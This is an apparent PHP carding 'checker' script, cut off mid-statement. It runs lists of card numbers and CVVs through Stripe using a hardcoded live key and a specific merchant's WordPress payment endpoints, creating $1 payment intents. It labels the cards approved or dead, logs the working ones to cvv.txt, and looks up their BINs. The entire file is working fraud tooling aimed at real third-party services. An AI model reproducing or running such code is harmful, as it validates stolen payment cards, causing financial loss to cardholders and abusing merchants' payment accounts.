  <?php
////3 REQ API
////////////////PHCommunityHackers
error_reporting(0);
set_time_limit(0);
error_reporting(0);
date_default_timezone_set('America/Buenos_Aires');


function multiexplode($delimiters, $string)
{
  $one = str_replace($delimiters, $delimiters[0], $string);
  $two = explode($delimiters[0], $one);
  return $two;
}
$lista = $_GET['lista'];
$cc = multiexplode(array(":", "|", ""), $lista)[0];
$mes = multiexplode(array(":", "|", ""), $lista)[1];
$ano = multiexplode(array(":", "|", ""), $lista)[2];
$cvv = multiexplode(array(":", "|", ""), $lista)[3];

function GetStr($string, $start, $end)
{
  $str = explode($start, $string);
  $str = explode($end, $str[1]);
  return $str[0];
}
////////////////////////////===[Randomizing Details Api]

$get = file_get_contents('https://randomuser.me/api/1.2/?nat=us');
preg_match_all("(\"first\":\"(.*)\")siU", $get, $matches1);
$name = $matches1[1][0];
preg_match_all("(\"last\":\"(.*)\")siU", $get, $matches1);
$last = $matches1[1][0];
preg_match_all("(\"email\":\"(.*)\")siU", $get, $matches1);
$email = $matches1[1][0];
preg_match_all("(\"street\":\"(.*)\")siU", $get, $matches1);
$street = $matches1[1][0];
preg_match_all("(\"city\":\"(.*)\")siU", $get, $matches1);
$city = $matches1[1][0];
preg_match_all("(\"state\":\"(.*)\")siU", $get, $matches1);
$state = $matches1[1][0];
preg_match_all("(\"phone\":\"(.*)\")siU", $get, $matches1);
$phone = $matches1[1][0];
preg_match_all("(\"postcode\":(.*),\")siU", $get, $matches1);
$postcode = $matches1[1][0];


////////////////////////////===[1ST CURL]
$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://api.stripe.com/v1/sources');
curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
curl_setopt($ch, CURLOPT_HEADER, 0);
curl_setopt($ch, CURLOPT_HTTPHEADER, array(
'content-type: application/x-www-form-urlencoded',
'origin: https://js.stripe.com',
'referer: https://js.stripe.com/',
'sec-fetch-dest: empty',
'sec-fetch-mode: cors',
'sec-fetch-site: same-site',
'user-agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88 Safari/537.36'
));

curl_setopt($ch, CURLOPT_POSTFIELDS, 'type=card&owner[name]=Amay+Magtila+Patisoy&owner[email]=amaycute%40gmail.com&owner[address][postal_code]=10010&card[number]='.$cc.'&card[cvc]='.$cvv.'&card[exp_month]='.$mes.'&card[exp_year]='.$ano.'&guid=33e9f525-01cb-4ecd-9106-4b1816ce15ecc978e9&muid=a7cfa01e-ecf0-4bec-9ca4-ad54d82b3a1a96d4c5&sid=0ef4ef21-90a3-41ec-919c-9abf5d9e4016b51baa&pasted_fields=number&payment_user_agent=stripe.js%2Fdb00c325%3B+stripe-js-v3%2Fdb00c325&time_on_page=200794&referrer=https%3A%2F%2Fgigabytesolutions.us%2F&key=pk_live_51HTRYbEhONXqxQqxsRG7XjS6wzznar1myKsRRgADS0Q60rZd8eMSBDjfIRGPpGvpYrkA7uHktTcdWOPhPGKhm97F00qPanES24');
//'user-agent: #'));
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'/cookie.txt');
curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/cookie.txt');
$resulta = curl_exec($ch);
$oten = json_decode($resulta, true);
$token1 = $oten['id'];

//////////////////////////===[2ND CURL]
$ch = curl_init();

curl_setopt($ch, CURLOPT_URL, 'https://gigabytesolutions.us/wp-json/wpsp/v2/customer');
curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
curl_setopt($ch, CURLOPT_HEADER, 0);
curl_setopt($ch, CURLOPT_HTTPHEADER, array( 
'content-type: application/x-www-form-urlencoded; charset=UTF-8',
'cookie: cookielawinfo-checkbox-necessary=yes; cookielawinfo-checkbox-non-necessary=yes; __stripe_mid=a7cfa01e-ecf0-4bec-9ca4-ad54d82b3a1a96d4c5; __stripe_sid=0ef4ef21-90a3-41ec-919c-9abf5d9e4016b51baa',
'origin: https://gigabytesolutions.us',
'referer: https://gigabytesolutions.us/pay/',
'sec-fetch-dest: empty',
'sec-fetch-mode: cors',
'sec-fetch-site: same-origin',
'user-agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88 Safari/537.36'
                  ));
curl_setopt($ch, CURLOPT_POSTFIELDS, 'form_values%5Bsimpay_customer_name%5D=Amay+Magtila+Patisoy&form_values%5Bsimpay_custom_amount%5D=1.00&form_values%5Bsimpay_email%5D=amaycute%40gmail.com&form_values%5Bsimpay_form_id%5D=1574&form_values%5Bsimpay_amount%5D=100&form_values%5B_wpnonce%5D=675005b920&form_values%5B_wp_http_referer%5D=%2Fpay%2F&form_data%5BformId%5D=1574&form_data%5BformInstance%5D=0&form_data%5Bquantity%5D=1&form_data%5BisValid%5D=true&form_data%5BstripeParams%5D%5Bkey%5D=pk_live_51HTRYbEhONXqxQqxsRG7XjS6wzznar1myKsRRgADS0Q60rZd8eMSBDjfIRGPpGvpYrkA7uHktTcdWOPhPGKhm97F00qPanES24&form_data%5BstripeParams%5D%5Bsuccess_url%5D=https%3A%2F%2Fgigabytesolutions.us%2Fpayment-confirmation%2F%3Fform_id%3D1574&form_data%5BstripeParams%5D%5Berror_url%5D=https%3A%2F%2Fgigabytesolutions.us%2Fpayment-failed%2F%3Fform_id%3D1574&form_data%5BstripeParams%5D%5Bname%5D=Gigabyte+Solutions&form_data%5BstripeParams%5D%5Bimage%5D=https%3A%2F%2Fgigabytesolutions.us%2Fwp-content%2Fuploads%2F2020%2F02%2Fgigabyte-logo.png&form_data%5BstripeParams%5D%5Blocale%5D=auto&form_data%5BstripeParams%5D%5Bcountry%5D=US&form_data%5BstripeParams%5D%5Bcurrency%5D=USD&form_data%5BstripeParams%5D%5Bdescription%5D=Product+%26+Services&form_data%5BstripeParams%5D%5BelementsLocale%5D=auto&form_data%5BstripeParams%5D%5Bamount%5D=100&form_data%5BisSubscription%5D=false&form_data%5BisTrial%5D=false&form_data%5BhasCustomerFields%5D=true&form_data%5BhasPaymentRequestButton%5D=false&form_data%5Bamount%5D=1&form_data%5BsetupFee%5D=0&form_data%5BminAmount%5D=1&form_data%5BtotalAmount%5D=&form_data%5BsubMinAmount%5D=0&form_data%5BplanIntervalCount%5D=0&form_data%5BtaxPercent%5D=0&form_data%5BfeePercent%5D=0&form_data%5BfeeAmount%5D=0&form_data%5BminCustomAmountError%5D=The+minimum+amount+allowed+is+%26%2336%3B1.00&form_data%5BsubMinCustomAmountError%5D=The+minimum+amount+allowed+is+%26%2336%3B0.00&form_data%5BpaymentButtonText%5D=Pay+with+Card&form_data%5BpaymentButtonLoadingText%5D=Please+Wait...&form_data%5BsubscriptionType%5D=disabled&form_data%5BplanInterval%5D=0&form_data%5BcheckoutButtonText%5D=Pay+%7B%7Bamount%7D%7D&form_data%5BcheckoutButtonLoadingText%5D=Please+Wait...&form_data%5BdateFormat%5D=mm%2Fdd%2Fyy&form_data%5BformDisplayType%5D=overlay&form_data%5BcustomAmount%5D=1&form_data%5BfinalAmount%5D=1.00&form_data%5BcouponCode%5D=&form_data%5Bdiscount%5D=0&form_data%5BuseCustomPlan%5D=true&form_data%5BcustomPlanAmount%5D=0&form_id=1574&source_id='.$token1.'');
//'user-agent: #'));
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'/cookie.txt');
curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/cookie.txt');
$result = curl_exec($ch);
$bilat = json_decode($result, true);
$token2 = $bilat['id'];


$ch = curl_init();

curl_setopt($ch, CURLOPT_URL, 'https://gigabytesolutions.us/wp-json/wpsp/v2/paymentintent/create');
curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
curl_setopt($ch, CURLOPT_HEADER, 0);
curl_setopt($ch, CURLOPT_HTTPHEADER, array( 
'content-type: application/x-www-form-urlencoded; charset=UTF-8',
'cookie: cookielawinfo-checkbox-necessary=yes; cookielawinfo-checkbox-non-necessary=yes; __stripe_mid=a7cfa01e-ecf0-4bec-9ca4-ad54d82b3a1a96d4c5; __stripe_sid=0ef4ef21-90a3-41ec-919c-9abf5d9e4016b51baa',
'origin: https://gigabytesolutions.us',
'referer: https://gigabytesolutions.us/pay/',
'sec-fetch-dest: empty',
'sec-fetch-mode: cors',
'sec-fetch-site: same-origin',
'user-agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88 Safari/537.36'
         ));
curl_setopt($ch, CURLOPT_POSTFIELDS, 'form_values%5Bsimpay_customer_name%5D=Amay+Magtila+Patisoy&form_values%5Bsimpay_custom_amount%5D=1.00&form_values%5Bsimpay_email%5D=amaycute%40gmail.com&form_values%5Bsimpay_form_id%5D=1574&form_values%5Bsimpay_amount%5D=100&form_values%5B_wpnonce%5D=675005b920&form_values%5B_wp_http_referer%5D=%2Fpay%2F&form_data%5BformId%5D=1574&form_data%5BformInstance%5D=0&form_data%5Bquantity%5D=1&form_data%5BisValid%5D=true&form_data%5BstripeParams%5D%5Bkey%5D=pk_live_51HTRYbEhONXqxQqxsRG7XjS6wzznar1myKsRRgADS0Q60rZd8eMSBDjfIRGPpGvpYrkA7uHktTcdWOPhPGKhm97F00qPanES24&form_data%5BstripeParams%5D%5Bsuccess_url%5D=https%3A%2F%2Fgigabytesolutions.us%2Fpayment-confirmation%2F%3Fform_id%3D1574&form_data%5BstripeParams%5D%5Berror_url%5D=https%3A%2F%2Fgigabytesolutions.us%2Fpayment-failed%2F%3Fform_id%3D1574&form_data%5BstripeParams%5D%5Bname%5D=Gigabyte+Solutions&form_data%5BstripeParams%5D%5Bimage%5D=https%3A%2F%2Fgigabytesolutions.us%2Fwp-content%2Fuploads%2F2020%2F02%2Fgigabyte-logo.png&form_data%5BstripeParams%5D%5Blocale%5D=auto&form_data%5BstripeParams%5D%5Bcountry%5D=US&form_data%5BstripeParams%5D%5Bcurrency%5D=USD&form_data%5BstripeParams%5D%5Bdescription%5D=Product+%26+Services&form_data%5BstripeParams%5D%5BelementsLocale%5D=auto&form_data%5BstripeParams%5D%5Bamount%5D=100&form_data%5BisSubscription%5D=false&form_data%5BisTrial%5D=false&form_data%5BhasCustomerFields%5D=true&form_data%5BhasPaymentRequestButton%5D=false&form_data%5Bamount%5D=1&form_data%5BsetupFee%5D=0&form_data%5BminAmount%5D=1&form_data%5BtotalAmount%5D=&form_data%5BsubMinAmount%5D=0&form_data%5BplanIntervalCount%5D=0&form_data%5BtaxPercent%5D=0&form_data%5BfeePercent%5D=0&form_data%5BfeeAmount%5D=0&form_data%5BminCustomAmountError%5D=The+minimum+amount+allowed+is+%26%2336%3B1.00&form_data%5BsubMinCustomAmountError%5D=The+minimum+amount+allowed+is+%26%2336%3B0.00&form_data%5BpaymentButtonText%5D=Pay+with+Card&form_data%5BpaymentButtonLoadingText%5D=Please+Wait...&form_data%5BsubscriptionType%5D=disabled&form_data%5BplanInterval%5D=0&form_data%5BcheckoutButtonText%5D=Pay+%7B%7Bamount%7D%7D&form_data%5BcheckoutButtonLoadingText%5D=Please+Wait...&form_data%5BdateFormat%5D=mm%2Fdd%2Fyy&form_data%5BformDisplayType%5D=overlay&form_data%5BcustomAmount%5D=1&form_data%5BfinalAmount%5D=1.00&form_data%5BcouponCode%5D=&form_data%5Bdiscount%5D=0&form_data%5BuseCustomPlan%5D=true&form_data%5BcustomPlanAmount%5D=0&form_id=1574&customer_id='.$token2.'&payment_method_id='.$token1.'');
//'user-agent: #'));
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'/cookie.txt');
curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/cookie.txt');

$resultb = curl_exec($ch);

///////////////////////// Bin Lookup Api //////////////////////////
// this is for additional info - so result will look more good by adding the info of the bin

$cctwo = substr("$cc", 0, 6);

$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://lookup.binlist.net/'.$cctwo.'');
curl_setopt($ch, CURLOPT_USERAGENT, $user_agent);
curl_setopt($ch, CURLOPT_HTTPHEADER, array(
'Host: lookup.binlist.net',
'Cookie: _ga=GA1.2.549903363.1545240628; _gid=GA1.2.82939664.1545240628',
'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8'
));
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_POSTFIELDS, '');
$fim = curl_exec($ch);
$fim = json_decode($fim,true);
$bank = $fim['bank']['name'];
$country = $fim['country']['alpha2'];
$type = $fim['type'];

if(strpos($fim, '"type":"credit"') !== false) {
  $type = 'Credit';
} else {
  $type = 'Debit';
}
function getbnk($bin)
{
 sleep(rand(1,6));
$bin = substr($bin,0,6);
$url = 'http://bins.su';
//  Initiate curl
$ch = curl_init();
// Disable SSL verification
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
// Will return the response, if false it print the response
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
// Set the url
curl_setopt($ch, CURLOPT_URL,$url);
// Execute
curl_setopt($ch, CURLOPT_POSTFIELDS, 'action=searchbins&bins='.$bin.'&BIN=&country=');
$result=curl_exec($ch);
// Closing
curl_close($ch);

// Will dump a beauty json :3
//var_dump(json_decode($result, true));

if (preg_match_all('(<tr><td>'.$bin.'</td><td>(.*)</td><td>(.*)</td><td>(.*)</td><td>(.*)</td><td>(.*)</td></tr>)siU', $result, $matches1))
{
$r1 = $matches1[1][0];
$r2 = $matches1[2][0];
$r3 = $matches1[3][0];
$r4 = $matches1[4][0];
$r5 = $matches1[5][0];
//if(stristr($result,$ip'<tr><td>(.*)</td><td>(.*)</td><td>(.*)</td><td>(.*)</td><td>(.*)</td><td>(.*)</td></tr>'))

 return "$r2 - $r1 - $r3 - $r4 - $r5";

}
else
{
 return "$bin|Unknown.";
}
}
/////////////////////////// [Card Response]  //////////////////////////
//////// dependig upon response of site you have to add or delete the results

if(strpos($result, '/donations/thank_you?donation_number=','' )) {
    echo '<span class="badge badge-success">Aprovada</span></span> </span> <span class="badge badge-success">'.$lista.'</span> <span class="badge badge-info">Approved</span></span> <span class="badge badge-primary">★𝓜𝓘𝓛𝓔𝓢★</span></br';
}
elseif(strpos($result,'"cvc_check":"pass",')){
      fwrite(fopen('cvv.txt', 'a'), $lista." "."cvv:MATCH✓"."\r\n");
    echo '<span class="badge badge-success">#Approved</span> </span> </span> <span class="badge badge-light">'.$lista.'</span> <span class="badge badge-warning">★ CVV MATCH✓ ★ ᴄᴠᴄ ᴄʜᴇᴄᴋ ᴘᴀss ★</span> </span> <span class="badge badge-light">'.getbnk($cc).'</span> <span class="badge badge-primary">★𝓜𝓘𝓛𝓔𝓢★</span></br>';
}
elseif(strpos($result,"The zip code you supplied failed validation.")){
    echo '<span class="badge badge-success">#Approved</span> </span> </span> <span class="badge badge-light">'.$lista.'</span> <span class="badge badge-warning">★ CVV MATCH✓ ★ AVS FAILED ★</span> </span> <span class="badge badge-light">'.getbnk($cc).'</span> <span class="badge badge-primary">★𝓜𝓘𝓛𝓔𝓢★</span></br>';
}
elseif(strpos($result,"The card's zip code failed validation.")){
fwrite(fopen('cvv.txt', 'a'), $lista." "."cvv:MATCH✓"."\r\n");
    echo '<span class="badge badge-success">#Approved</span> </span> </span> <span class="badge badge-light">'.$lista.'</span> <span class="badge badge-warning">★ CVV MATCH✓ ★ AVS FAILED ★</span> </span> <span class="badge badge-light">'.getbnk($cc).'</span> <span class="badge badge-primary">★𝓜𝓘𝓛𝓔𝓢★</span></br>';
}
elseif(strpos($result,"Something went to please try again")){
    echo '<span class="badge badge-success">#Approved</span> </span> </span> <span class="badge badge-light">'.$lista.'</span> <span class="badge badge-warning">★ CVV MATCH✓ ★ SITE FAILED ★</span> </span> <span class="badge badge-light">'.getbnk($cc).'</span> <span class="badge badge-primary">★𝓜𝓘𝓛𝓔𝓢★</span></br>';
}
elseif(strpos($result, "Thank You For Donation." )) {
    echo '<span class="badge badge-danger">Aprovada</span> </span> <span class="badge badge-dark">'.$lista.'</span> <span class="badge badge-danger">Approved</span> </span> <span class="badge badge-primary">★𝓜𝓘𝓛𝓔𝓢★</span> </br>';
}
elseif(strpos($result, "Thank You." )) {
    echo '<span class="badge badge-danger">Aprovada</span> </span> <span class="badge badge-dark">'.$lista.'</span> <span class="badge badge-danger">Approved</span> </span> <span class="badge badge-primary">★𝓜𝓘𝓛𝓔𝓢★</span> </br>';
}
elseif(strpos($result,'"status": "succeeded"')){
    echo '<span class="badge badge-danger">DIE✘</span> </span> <span class="badge badge-dark">'.$lista.'</span> <span class="badge badge-danger">Approved</span> </span> <span class="badge badge-primary">★𝓜𝓘𝓛𝓔𝓢★</span> </br>';
}
elseif(strpos($result, 'Your card zip code is incorrect.' )) {
    echo '<span class="badge badge-danger">DIE✘</span> </span> <span class="badge badge-dark">'.$lista.'</span> <span class="badge badge-danger">Declined✘</span> </span> <span class="badge badge-primary">★𝓜𝓘𝓛𝓔𝓢★</span> </br>';
}
elseif(strpos($result, "incorrect_zip" )) {
    echo '<span class="badge badge-danger">DIE✘</span> </span> <span class="badge badge-dark">'.$lista.'</span> <span class="badge badge-danger">Declined✘</span> </span> <span class="badge badge-primary">★𝓜𝓘𝓛𝓔𝓢★</span> </br>';
}
elseif(strpos($result, "Success" )) {
    echo '<span class="badge badge-danger">DIE✘</span> </span> <span class="badge badge-dark">'.$lista.'</span> <span class="badge badge-danger">Declined✘</span> </span> <span class="badge badge-primary">★𝓜𝓘𝓛𝓔𝓢★</span> </br>';
}
elseif(strpos($result, "succeeded." )) {
    echo '<span class="badge badge-danger">DIE✘</span> </span> <span class="badge badge-dark">'.$lista.'</span> <span class="badge badge-danger">Declined✘</span> </span> <span class="badge badge-primary">★𝓜𝓘𝓛𝓔𝓢★</span> </br>';
}
elseif(strpos($result,"fraudulent")){
    echo '<span class="badge badge-danger">DIE✘</span> </span> <span class="badge badge-dark">'.$lista.'</span> <span class="badge badge-danger">Declined✘</span> </span> <span class="badge badge-primary">★𝓜𝓘𝓛𝓔𝓢★</span> </br>';
}
elseif(strpos($result,'"type":"one-time"')){
    echo '<span class="badge badge-danger">DIE✘</span> </span> <span class="badge badge-dark">'.$lista.'</span> <span class="badge badge-danger">Declined✘</span> </span> <span class="badge badge-primary">★𝓜𝓘𝓛𝓔𝓢★</span> </br>';
}
elseif(strpos($result, 'Your card has insufficient funds.')) {
    echo '<span class="badge badge-danger">DIE✘</span> </span> <span class="badge badge-dark">'.$lista.'</span> <span class="badge badge-danger">Declined✘ ʏᴏᴜʀ ᴄᴀʀᴅ ʜᴀs ɪɴsᴜғғɪᴄɪᴇɴᴛ ғᴜɴᴅs</span> </span> <span class="badge badge-primary">★𝓜𝓘𝓛𝓔𝓢★</span> </br>';
}
elseif(strpos($result, "insufficient_funds")) {
    echo '<span class="badge badge-danger">DIE✘</span> </span> <span class="badge badge-dark">'.$lista.'</span> <span class="badge badge-danger">Declined✘ ɪɴsᴜғғɪᴄɪᴇɴᴛ_ғᴜɴᴅs</span> </span> <span class="badge badge-primary">★𝓜𝓘𝓛𝓔𝓢★</span> </br>';
}
elseif(strpos($result, "lost_card" )) {
    echo '<span class="badge badge-danger">DIE✘</span> </span> <span class="badge badge-dark">'.$lista.'</span> <span class="badge badge-danger">Declined✘ ʟᴏsᴛ_ᴄᴀʀᴅ</span> </span> <span class="badge badge-primary">★𝓜𝓘𝓛𝓔𝓢★</span> </br>';
}
elseif(strpos($result, "stolen_card" )) {
    echo '<span class="badge badge-danger">DIE✘</span> </span> <span class="badge badge-dark">'.$lista.'</span> <span class="badge badge-danger">Declined✘ sᴛᴏʟᴇɴ_ᴄᴀʀᴅ</span> </span> <span class="badge badge-primary">★𝓜𝓘𝓛𝓔𝓢★</span> </br>';
}
elseif(strpos($result, "Your card's security code is incorrect." )) {
    echo '<span class="badge badge-warning">#Approve</span> <span class="badge badge-light">'.$lista.'</span> <span class="badge badge-warning">CCN ★ ʏᴏᴜʀ ᴄᴀʀᴅs sᴇᴄᴜʀɪᴛʏ ᴄᴏᴅᴇ ɪs ɪɴᴄᴏʀʀᴇᴄᴛ ★</span> <span class="badge badge-light">'.getbnk($cc).'</span> <span class="badge badge-primary">★𝓜𝓘𝓛𝓔𝓢★</span></br>';
}
elseif(strpos($result, "Your card's security code is incorrect." )) {
    echo '<span class="badge badge-warning">#Approve</span> <span class="badge badge-light">'.$lista.'</span> <span class="badge badge-warning">CCN ★ ʏᴏᴜʀ ᴄᴀʀᴅs sᴇᴄᴜʀɪᴛʏ ᴄᴏᴅᴇ ɪs ɪɴᴄᴏʀʀᴇᴄᴛ ★</span> <span class="badge badge-light">'.getbnk($cc).'</span> <span class="badge badge-primary">★𝓜𝓘𝓛𝓔𝓢★</span></br>';
}
elseif(strpos($result, "The card's security code is incorrect." )) {
    echo '<span class="badge badge-warning">#Approve</span> <span class="badge badge-light">'.$lista.'</span> <span class="badge badge-warning">CCN ★ ʏᴏᴜʀ ᴄᴀʀᴅs sᴇᴄᴜʀɪᴛʏ ᴄᴏᴅᴇ ɪs ɪɴᴄᴏʀʀᴇᴄᴛ ★</span> <span class="badge badge-light">'.getbnk($cc).'</span> <span class="badge badge-primary">★𝓜𝓘𝓛𝓔𝓢★</span></br>';
}
elseif(strpos($result, 'security code is invalid.' )) {
    echo '<span class="badge badge-danger">DIE✘</span> </span> <span class="badge badge-dark">'.$lista.'</span> <span class="badge badge-danger">Declined✘ sᴇᴄᴜʀɪᴛʏ ᴄᴏᴅᴇ ɪs ɪɴᴠᴀʟɪᴅ</span> </span> <span class="badge badge-primary">★𝓜𝓘𝓛𝓔𝓢★</span> </br>';
}
elseif(strpos($result, "incorrect_cvc" )) {
    echo '<span class="badge badge-danger">DIE✘</span> </span> <span class="badge badge-dark">'.$lista.'</span> <span class="badge badge-danger">Declined✘ ɪɴᴄᴏʀʀᴇᴄᴛ_ᴄᴠᴄ</span> </span> <span class="badge badge-primary">★𝓜𝓘𝓛𝓔𝓢★</span> </br>';
}
elseif(strpos($result, "pickup_card" )) {
    echo '<span class="badge badge-danger">DIE✘</span> </span> <span class="badge badge-dark">'.$lista.'</span> <span class="badge badge-danger">Declined✘</span> </span> <span class="badge badge-primary">★𝓜𝓘𝓛𝓔𝓢★</span> </br>';
}
elseif(strpos($result, 'Your card has expired.')) {
    echo '<span class="badge badge-danger">DIE✘</span> </span> <span class="badge badge-dark">'.$lista.'</span> <span class="badge badge-danger">Declined✘ ʏᴏᴜʀ ᴄᴀʀᴅ ʜᴀs ᴇxᴘɪʀᴇᴅ</span> </span> <span class="badge badge-primary">★𝓜𝓘𝓛𝓔𝓢★</span> </br>';
}
elseif(strpos($result, "expired_card" )) {
    echo '<span class="badge badge-danger">DIE✘</span> </span> <span class="badge badge-dark">'.$lista.'</span> <span class="badge badge-danger">Declined✘ ᴇxᴘɪʀᴇᴅ_ᴄᴀʀᴅ</span> </span> <span class="badge badge-primary">★𝓜𝓘𝓛𝓔𝓢★</span> </br>';
}
elseif(strpos($result, 'Your card number is incorrect.')) {
    echo '<span class="badge badge-danger">DIE✘</span> </span> <span class="badge badge-dark">'.$lista.'</span> <span class="badge badge-danger">Declined✘ ʏᴏᴜʀ ᴄᴀʀᴅ ɴᴜᴍʙᴇʀ ɪs ɪɴᴄᴏʀʀᴇᴄᴛ</span> </span> <span class="badge badge-primary">★𝓜𝓘𝓛𝓔𝓢★</span> </br>';
}
elseif(strpos($result, "incorrect_number")) {
    echo '<span class="badge badge-danger">DIE✘</span> </span> <span class="badge badge-dark">'.$lista.'</span> <span class="badge badge-danger">Declined✘ ɪɴᴄᴏʀʀᴇᴄᴛ_ɴᴜᴍʙᴇʀ</span> </span> <span class="badge badge-primary">★𝓜𝓘𝓛𝓔𝓢★</span> </br>';
}
elseif(strpos($result, "service_not_allowed")) {
    echo '<span class="badge badge-danger">DIE✘</span> </span> <span class="badge badge-dark">'.$lista.'</span> <span class="badge badge-danger">Declined✘</span> </span> <span class="badge badge-primary">★𝓜𝓘𝓛𝓔𝓢★</span> </br>';
}
elseif(strpos($result, "do_not_honor")) {
    echo '<span class="badge badge-danger">DIE✘</span> </span> </span> <span class="badge badge-dark">'.$lista.'</span> <span class="badge badge-danger">ᴅᴏ ɴᴏᴛ ʜᴏɴᴏʀ</span> ◈</span> <span class="badge badge-primary">★𝓜𝓘𝓛𝓔𝓢★</span> </br>';
}
elseif(strpos($result, 'Your card was declined.')) {
    echo '<span class="badge badge-danger">DIE✘</span> </span> <span class="badge badge-dark">'.$lista.'</span> <span class="badge badge-danger">Declined✘ ʏᴏᴜʀ ᴄᴀʀᴅ ᴡᴀs ᴅᴇᴄʟɪɴᴇᴅ</span> </span> <span class="badge badge-primary">★𝓜𝓘𝓛𝓔𝓢★</span> </br>';
}
elseif(strpos($result, "generic_decline")) {
    echo '<span class="badge badge-danger">DIE✘</span> </span> </span> <span class="badge badge-dark">'.$lista.'</span> <span class="badge badge-danger">ɢᴇɴᴇʀɪᴄ ᴅᴇᴄʟɪɴᴇ</span> </span> <span class="badge badge-primary">★𝓜𝓘𝓛𝓔𝓢★</span> </br>';
}
elseif(strpos($result,'"cvc_check": "unavailable"')){
    echo '<span class="badge badge-danger">DIE✘</span> </span> <span class="badge badge-dark">'.$lista.'</span> <span class="badge badge-danger">Declined✘ ᴄᴠᴄ ᴄʜᴇᴄᴋ ᴜɴᴀᴠᴀɪʟᴀʙʟᴇ</span> </span> <span class="badge badge-primary">★𝓜𝓘𝓛𝓔𝓢★</span> </br>';
}
elseif(strpos($result,'"cvc_check": "unchecked"')){
    echo '<span class="badge badge-danger">DIE✘</span> </span> </span> <span class="badge badge-dark">'.$lista.'</span> <span class="badge badge-danger">ᴄᴠᴄ ᴄʜᴇᴄᴋ ᴜɴᴄʜᴇᴄᴋᴇᴅ</span> </span> <span class="badge badge-primary">★𝓜𝓘𝓛𝓔𝓢★</span> </br>';
}
elseif(strpos($result, '"cvc_check":"fail"' )) {
        fwrite(fopen('seseen.txt', 'a'), $lista." "."cvv:fail"."\r\n");
    echo '<span class="badge badge-warning">#Approve</span> <span class="badge badge-light">'.$lista.'</span> <span class="badge badge-warning">CCN ★ ᴄᴠᴄ ᴄʜᴇᴄᴋ ғᴀɪʟ ★</span> <span class="badge badge-light">'.getbnk($cc).'</span> <span class="badge badge-primary">★𝓜𝓘𝓛𝓔𝓢★</span></br>';
}
elseif(strpos($result,"parameter_invalid_empty")){
    echo '<span class="badge badge-danger">DIE✘</span> </span> <span class="badge badge-dark">'.$lista.'</span> <span class="badge badge-danger">Declined✘</span> </span> <span class="badge badge-primary">★𝓜𝓘𝓛𝓔𝓢★</span> </br>';
}
elseif(strpos($result,"lock_timeout")){
    echo '<span class="badge badge-danger">DIE✘</span> </span> <span class="badge badge-dark">'.$lista.'</span> <span class="badge badge-danger">Declined✘</span> </span> <span class="badge badge-primary">★𝓜𝓘𝓛𝓔𝓢★</span> </br>';
}
elseif (strpos($result,'Your card does not support this type of purchase.')) {
    echo '<span class="badge badge-danger">DIE✘</span> </span> <span class="badge badge-dark">'.$lista.'</span> <span class="badge badge-danger">Declined✘</span> </span> <span class="badge badge-primary">★𝓜𝓘𝓛𝓔𝓢★</span> </br>';
}
elseif(strpos($result,"transaction_not_allowed")){
    echo '<span class="badge badge-danger">DIE✘</span> </span> <span class="badge badge-dark">'.$lista.'</span> <span class="badge badge-danger">Declined✘</span> </span> <span class="badge badge-primary">★𝓜𝓘𝓛𝓔𝓢★</span> </br>';
}
elseif(strpos($result,"three_d_secure_redirect")){
     echo '<span class="badge badge-danger">DIE✘</span> </span> <span class="badge badge-dark">'.$lista.'</span> <span class="badge badge-danger">Declined✘</span> </span> <span class="badge badge-primary">★𝓜𝓘𝓛𝓔𝓢★</span> </br>';
}
elseif(strpos($result, 'Card is declined by your bank, please contact them for additional information.')) {
    echo '<span class="badge badge-danger">DIE✘</span> </span> <span class="badge badge-dark">'.$lista.'</span> <span class="badge badge-danger">Declined✘</span> </span> <span class="badge badge-primary">★𝓜𝓘𝓛𝓔𝓢★</span> </br>';
}
elseif(strpos($result,"missing_payment_information")){
     '<span class="badge badge-danger">DIE✘</span> </span> <span class="badge badge-dark">'.$lista.'</span> <span class="badge badge-danger">Declined✘</span> </span> <span class="badge badge-primary">★𝓜𝓘𝓛𝓔𝓢★</span> </br>';
}
elseif(strpos($result, "Payment cannot be processed, missing credit card number")) {
     '<span class="badge badge-danger">DIE✘</span> </span> <span class="badge badge-dark">'.$lista.'</span> <span class="badge badge-danger">Declined✘</span> </span> <span class="badge badge-primary">★𝓜𝓘𝓛𝓔𝓢★</span> </br>';
}
elseif (strpos($result, "Your payment has already been processed")) {
